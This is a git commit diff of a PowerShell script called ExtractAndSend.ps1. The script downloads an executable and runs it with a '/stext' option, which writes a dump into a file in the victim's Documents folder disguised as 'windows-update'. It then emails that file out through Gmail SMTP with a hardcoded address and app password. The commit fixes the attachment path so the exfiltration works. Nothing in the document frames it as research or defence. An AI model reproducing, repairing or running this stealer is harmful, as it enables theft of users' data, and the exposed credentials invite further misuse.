ed576009a2169206a7e45e3ac1a5d7b3ee1f4f78
RRR3d <105751665+RRR3d@users.noreply.github.com>
2023-07-10 19:41:57 +0300

    fixed some issues

--- ExtractAndSend.ps1
+++ ExtractAndSend.ps1
@@ -4,8 +4,10 @@ $Command = "$FilePath /stext $env:USERPROFILE\Documents\windows-update"
 
 # Download the file
 Invoke-WebRequest -Uri $URL -OutFile $FilePath
+
 # Run the command
 Start-Process -FilePath $FilePath -ArgumentList $Command -Wait
+
 $Username = 'xpharoh1@gmail.com'
 $Password = 'wypuwcjskmqelujk'
 $EmailFrom = 'xpharoh1@gmail.com'
@@ -14,7 +16,7 @@ $Subject = 'URGENT-MSG'
 $Body = 'PLEASE CHECK THE ATTACHED FILE'
 $SMTPServer = 'smtp.gmail.com'
 $SMTPPort = 587
-$Attachment = '$env:USERPROFILE\Documents\windows-update'
+$Attachment = Join-Path $env:USERPROFILE\Documents 'windows-update'
 
 $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
